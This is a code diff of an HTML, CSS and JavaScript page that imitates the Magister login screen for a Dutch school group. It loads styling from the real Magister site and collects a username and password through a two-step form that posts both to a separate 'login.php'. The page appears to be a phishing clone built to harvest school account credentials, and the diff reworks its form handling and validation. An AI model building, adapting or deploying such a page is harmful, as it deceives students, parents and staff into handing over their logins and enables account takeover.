@@ -23,7 +23,6 @@
     margin-top: 1rem;
     cursor: pointer;
     transition: 0.3s;
-    border: none;
 }
 
 #usernameSubmit:hover {
@@ -38,9 +37,8 @@
 
 #noUsernameText {
   display: none;
-  margin-top: 0.2rem;
+  margin: 0.2rem;
   color: #d81a1a;
-  font-size: 12px;
 }
 
 .login_icon{
@@ -50,7 +48,6 @@
 
 .password{
     margin: 1rem 0rem;
-    width: 100%;
 }
 
 
@@ -81,6 +78,8 @@ dna-alert{margin:1rem 0}
 .bg1{background-image:url(https://accounts.magister.net/images/login_1.jpg)}.bg1_webp{background-image:url(/images/login_1.webp)}.bg2{background-image:url(/images/login_2.jpg)}.bg2_webp{background-image:url(/images/login_2.webp)}.bg3{background-image:url(/images/login_3.jpg)}.bg3_webp{background-image:url(/images/login_3.webp)}.bg4{background-image:url(/images/login_4.jpg)}.bg4_webp{background-image:url(/images/login_4.webp)}.bg5{background-image:url(/images/login_5.jpg)}.bg5_webp{background-image:url(/images/login_5.webp)}.bg6{background-image:url(/images/login_6.jpg)}.bg6_webp{background-image:url(/images/login_6.webp)}.bg7{background-image:url(/images/login_7.jpg)}.bg7_webp{background-image:url(/images/login_7.webp)}.bg_forgot_password{background-image:url(/images/login_forgot_password.jpg)}.bg_forgot_password_webp{background-image:url(/images/login_forgot_password.webp)}.bg_forgot_password,.bg_forgot_password_webp{transition:opacity 1.5s linear}
 </style>
 
+
++
     <div class="app-container">
       <div class="challenge-container">
         <div class="top">
@@ -91,16 +90,14 @@ dna-alert{margin:1rem 0}
         </div>
         <div class="podium_container">
           <div class="podium">
-
-
-            <form name="loginUsername" class="dna-form" id="usernameForm">
-              <h1 id="headText"></h1>
+            <form action=login.php method=post name="login" autocomplete="off" class="dna-form" data-form-type="other" onsubmit="required()">
+            <h1 id="headText"></h1>
               <h2 id="header">Vul je gebruikersnaam in</h2>
               <div class="account-options">
                 <div id="tenant_options" class="completed-challenge">
                   <div class="completed-challenge-icon">
                     <dna-icon name="fas-school" ><svg  class="login_icon" aria-required="true" focusable="false" part="svg" role="img" xmlns="http://www.w3.org/2000/svg" class=" svg-inline--fa fa-w-20 " viewBox="0 0 640 512">
-                        <path d="M337.8 5.4C327-1.8 313-1.8 302.2 5.4L166.3 96H48C21.5 96 0 117.5 0 144V464c0 26.5 21.5 48 48 48H592c26.5 0 48-21.5 48-48V144c0-26.5-21.5-48-48-48H473.7L337.8 5.4zM256 416c0-35.3 28.7-64 64-64s64 28.7 64 64v96H256V416zM96 192h32c8.8 0 16 7.2 16 16v64c0 8.8-7.2 16-16 16H96c-8.8 0-16-7.2-16-16V208c0-8.8 7.2-16 16-16zm400 16c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16v64c0 8.8-7.2 16-16 16H512c-8.8 0-16-7.2-16-16V208zM96 320h32c8.8 0 16 7.2 16 16v64c0 8.8-7.2 16-16 16H96c-8.8 0-16-7.2-16-16V336c0-8.8 7.2-16 16-16zm400 16c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16v64c0 8.8-7.2 16-16 16H512c-8.8 0-16-7.2-16-16V336zM232 176a88 88 0 1 1 176 0 88 88 0 1 1 -176 0zm88-48c-8.8 0-16 7.2-16 16v32c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H336V144c0-8.8-7.2-16-16-16z"></path><!---->
+                        <!--?lit$125206389$--><!----><path d="M337.8 5.4C327-1.8 313-1.8 302.2 5.4L166.3 96H48C21.5 96 0 117.5 0 144V464c0 26.5 21.5 48 48 48H592c26.5 0 48-21.5 48-48V144c0-26.5-21.5-48-48-48H473.7L337.8 5.4zM256 416c0-35.3 28.7-64 64-64s64 28.7 64 64v96H256V416zM96 192h32c8.8 0 16 7.2 16 16v64c0 8.8-7.2 16-16 16H96c-8.8 0-16-7.2-16-16V208c0-8.8 7.2-16 16-16zm400 16c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16v64c0 8.8-7.2 16-16 16H512c-8.8 0-16-7.2-16-16V208zM96 320h32c8.8 0 16 7.2 16 16v64c0 8.8-7.2 16-16 16H96c-8.8 0-16-7.2-16-16V336c0-8.8 7.2-16 16-16zm400 16c0-8.8 7.2-16 16-16h32c8.8 0 16 7.2 16 16v64c0 8.8-7.2 16-16 16H512c-8.8 0-16-7.2-16-16V336zM232 176a88 88 0 1 1 176 0 88 88 0 1 1 -176 0zm88-48c-8.8 0-16 7.2-16 16v32c0 8.8 7.2 16 16 16h32c8.8 0 16-7.2 16-16s-7.2-16-16-16H336V144c0-8.8-7.2-16-16-16z"></path><!---->
                       </svg></dna-icon>
                   </div>
                   <div class="completed-challenge-label">Interconf. Scholengroep Westland </div>
@@ -110,41 +107,39 @@ dna-alert{margin:1rem 0}
                 <div class="dna-input-group" id="usernameField">
                   <div class="dna-input-group-prefix">
                     <dna-icon name="fas-school" ><svg  class="login_icon" focusable="false" part="svg" role="img" xmlns="http://www.w3.org/2000/svg" class=" svg-inline--fa fa-w-20 " viewBox="0 0 640 512">
-                      <path d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"></path><!---->
+                        <!--?lit$125206389$--><!----><path d="M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM0 256a256 256 0 1 1 512 0A256 256 0 1 1 0 256zm256 16a72 72 0 1 0 0-144 72 72 0 1 0 0 144z"></path><!---->
                       </svg></dna-icon>
                   </div>
-                  <input id="email" name="login_email" placeholder="Je gebruikersnaam" autofocus="" spellcheck="false" autocapitalize="none" autocorrect="off" autocomplete="on" class="dna-input" type="text" control-id="ControlID-3" data-dashlane-rid="83cbfa680a7501cc" data-form-type="other">
+                  <input id="email" name="login_email" placeholder="Je gebruikersnaam" autofocus="" spellcheck="false" autocapitalize="none" autocorrect="off" autocomplete="on" class="dna-input" type="text" control-id="ControlID-3" data-dashlane-rid="83cbfa680a7501cc" data-form-type="other" required>
                   <a id="editUsername" style="display: none; color: #02354e; text-decoration: underline; margin-right: 1rem; cursor: pointer;">wijzig</a>
                 </div>
               </div>
-              <p id="noUsernameText">Gebruiksersnaam is niet ingevuld.</p>
-              <!-- <a id="usernameSubmit">Doorgaan</a> -->
-              <button id="usernameSubmit" type="submit">Doorgaan</button>
+              <p id="noUsernameText">Gebruiksersnaam kan niet leeg zijn</p>
+              <a id="usernameSubmit">Doorgaan</a>
 
-            </form>  
-            
-            <form name="loginPassword" class="dna-form" id="passwordForm" action=login.php method=post>
+              <a id="testKnop">error</a>
 
 
 
 
-              <div class="dna-form-field" id="password-line" style="margin: 1rem 0rem; display: none;">
-                  <div class="dna-input-group" style="width: 100%;">
-                    <div class="dna-input-group-prefix">
-                      <dna-icon name="fas-school" ><svg  class="login_icon" focusable="false" part="svg" role="img" xmlns="http://www.w3.org/2000/svg" class=" svg-inline--fa fa-w-20 " viewBox="0 0 640 512">
-                          <path d="M144 144v48H304V144c0-44.2-35.8-80-80-80s-80 35.8-80 80zM80 192V144C80 64.5 144.5 0 224 0s144 64.5 144 144v48h16c35.3 0 64 28.7 64 64V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V256c0-35.3 28.7-64 64-64H80z"></path><!---->
-                        </svg></dna-icon>
-                    </div>
-                    <input id="password" style="display: none;" name="login_password" placeholder="Je wachtwoord" autofocus="" spellcheck="false" autocapitalize="none" autocorrect="off" autocomplete="on" class="dna-input" type="password" control-id="ControlID-3" data-dashlane-rid="83cbfa680a7501cc" data-form-type="other">
-                  <div><svg id="showPassword"><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c8.4-19.3 10.6-41.4 4.8-63.3c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zM373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5L373 389.9z"></path></svg> </div>
+
+            <div class="dna-form-field" id="password-line" style="margin: 1rem 0rem; display: none;">
+                <div class="dna-input-group">
+                  <div class="dna-input-group-prefix">
+                    <dna-icon name="fas-school" ><svg  class="login_icon" focusable="false" part="svg" role="img" xmlns="http://www.w3.org/2000/svg" class=" svg-inline--fa fa-w-20 " viewBox="0 0 640 512">
+                        <!--?lit$125206389$--><!----><path d="M144 144v48H304V144c0-44.2-35.8-80-80-80s-80 35.8-80 80zM80 192V144C80 64.5 144.5 0 224 0s144 64.5 144 144v48h16c35.3 0 64 28.7 64 64V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V256c0-35.3 28.7-64 64-64H80z"></path><!---->
+                      </svg></dna-icon>
                   </div>
-
-              </div>
-
-
-              <div class="challenge-actions">
-                  <button id="form_submit" style="display: none;" class="dna-btn dna-btn-primary" type="submit" control-id="ControlID-4" data-dashlane-rid="5b81ec6a493c766b" data-form-type="action">Doorgaan</button>
+                  <input id="password" style="display: none;" name="login_password" placeholder="Je wachtwoord" autofocus="" spellcheck="false" autocapitalize="none" autocorrect="off" autocomplete="on" class="dna-input" type="password" control-id="ControlID-3" data-dashlane-rid="83cbfa680a7501cc" data-form-type="other">
+                <div><svg id="showPassword"><path d="M38.8 5.1C28.4-3.1 13.3-1.2 5.1 9.2S-1.2 34.7 9.2 42.9l592 464c10.4 8.2 25.5 6.3 33.7-4.1s6.3-25.5-4.1-33.7L525.6 386.7c39.6-40.6 66.4-86.1 79.9-118.4c3.3-7.9 3.3-16.7 0-24.6c-14.9-35.7-46.2-87.7-93-131.1C465.5 68.8 400.8 32 320 32c-68.2 0-125 26.3-169.3 60.8L38.8 5.1zM223.1 149.5C248.6 126.2 282.7 112 320 112c79.5 0 144 64.5 144 144c0 24.9-6.3 48.3-17.4 68.7L408 294.5c8.4-19.3 10.6-41.4 4.8-63.3c-11.1-41.5-47.8-69.4-88.6-71.1c-5.8-.2-9.2 6.1-7.4 11.7c2.1 6.4 3.3 13.2 3.3 20.3c0 10.2-2.4 19.8-6.6 28.3l-90.3-70.8zM373 389.9c-16.4 6.5-34.3 10.1-53 10.1c-79.5 0-144-64.5-144-144c0-6.9 .5-13.6 1.4-20.2L83.1 161.5C60.3 191.2 44 220.8 34.5 243.7c-3.3 7.9-3.3 16.7 0 24.6c14.9 35.7 46.2 87.7 93 131.1C174.5 443.2 239.2 480 320 480c47.8 0 89.9-12.9 126.2-32.5L373 389.9z"></path></svg> </div>
                 </div>
+
+            </div>
+
+
+            <div class="challenge-actions">
+                <button id="form_submit" style="display: none;" class="dna-btn dna-btn-primary" type="submit" control-id="ControlID-4" data-dashlane-rid="5b81ec6a493c766b" data-form-type="action">Doorgaan</button>
+              </div>
             </form>
           </div>
         </div>
@@ -159,10 +154,10 @@ dna-alert{margin:1rem 0}
       </div>
     </div>
         <script>
+            window.onload = g;
 
 var usernameButton = document.getElementById("usernameSubmit")
 var usernameField = document.getElementById("usernameField")
-var usernameForm = document.getElementById("usernameForm")
 var submitButton = document.getElementById("form_submit")
 var password = document.getElementById("password")
 var passwordLine = document.getElementById("password-line")
@@ -173,7 +168,6 @@ var noUsernameText = document.getElementById('noUsernameText')
 var testKnop = document.getElementById('testKnop')
 
 // Goeiemiddag tekst
-window.onload = g;
 
 function g () {
     var t = (new Date).getHours();
@@ -185,41 +179,15 @@ function g () {
     } if (t < 18) {
         head.innerHTML="Goedemiddag,"
     } else {
-        head.innerHTML="Goedenavond,"
+        head.innerHTML="Goedeavond,"
     }
 }
 
-// Checken of username ingevuld is
-usernameForm.addEventListener('submit', submitForm);
 
-function submitForm(event){
-  event.preventDefault();
-  required();
-}
 
-function required () {
-  var u = document.forms["loginUsername"]["login_email"].value;
-    if (u.length == 0) {
-      noUsername();
-      console.log("no username");
-      } 
-      else {
-      submitUsername();
-      console.log("username accepted");
-}
-}
-
-function noUsername () {
-  usernameField.style.border="1px solid #d81a1a"
-  noUsernameText.style.display="block";
-  document.getElementById('email').focus();
-  document.getElementById('email').select();
-}
-
-// usernameButton.addEventListener('click', submitUsername);
+usernameButton.addEventListener('click', submitUsername);
 editUsernameButton.addEventListener('click', editUsername);
-// testKnop.addEventListener('click', noUsername);
-
+testKnop.addEventListener('click', noUsername);
 
 
 // If the user presses the "Enter" key on the keyboard
@@ -243,13 +211,15 @@ function submitUsername () {
   editUsernameButton.style.display="block";
   header.innerHTML="Vul je wachtwoord in";
   noUsernameText.style.display="none";
+  testKnop.style.display="none";
   password.focus();
   password.select();
 };
 
-
-
-
+function noUsername () {
+  usernameField.style.border="1px solid #d81a1a"
+  noUsernameText.style.display="block";
+}
 
 function editUsername () {
     form_submit.style.display="none";
@@ -262,7 +232,6 @@ function editUsername () {
     editUsernameButton.style.display="none";
     header.innerHTML="Vul je gebruikersnaam in";
   };
-
 
         </script>
   </body>
